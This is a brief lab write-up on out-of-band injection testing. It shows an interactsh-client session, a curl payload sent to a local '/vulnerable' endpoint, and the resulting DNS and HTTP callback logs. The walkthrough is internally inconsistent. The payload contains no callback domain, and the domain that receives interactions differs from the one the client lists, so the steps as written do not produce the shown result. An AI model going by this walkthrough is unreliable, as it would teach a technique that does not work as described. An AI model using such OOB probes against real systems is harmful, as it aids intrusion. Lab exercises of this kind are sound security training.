### Solving the lab



<li> We firstly start our interact sh client: 
<li>└─$ ./interactsh-client 
[INF] Current interactsh version 1.3.1 (latest)

[INF] Listing 1 payload for OOB Testing
[INF] d81es9k940njri5m0rr03crqndfyjeesp.oast.pro
</li>

<li> This is our payload for the oob client: curl -H "User-Agent: trigger_callback" "http://127.0.0.1:5000/vulnerable?input=trigger_callback"

<li> After we inject our payload, we get a response in the interactsh-client:
[INF] d81et74940nk1fe18vs0yc1fzu3jfzkji.oast.fun
[d81et74940nk1fe18vs0yc1fzu3jfzkji] Received DNS interaction (A) From 62.217.245.66 at 2026-05-12 09:26:12
[d81et74940nk1fe18vs0yc1fzu3jfzkji] Received DNS interaction (AAAA) From 62.217.245.67 at 2026-05-12 09:26:12
[d81et74940nk1fe18vs0yc1fzu3jfzkji] Received DNS interaction (AAAA) From 62.217.245.67 at 2026-05-12 09:26:13
[d81et74940nk1fe18vs0yc1fzu3jfzkji] Received DNS interaction (AAAA) From 62.217.245.71 at 2026-05-12 09:26:13
[d81et74940nk1fe18vs0yc1fzu3jfzkji] Received DNS interaction (AAAA) From 62.217.245.71 at 2026-05-12 09:26:13
[d81et74940nk1fe18vs0yc1fzu3jfzkji] Received HTTP interaction From 109.166.132.195 at 2026-05-12 09:26:15
</li>
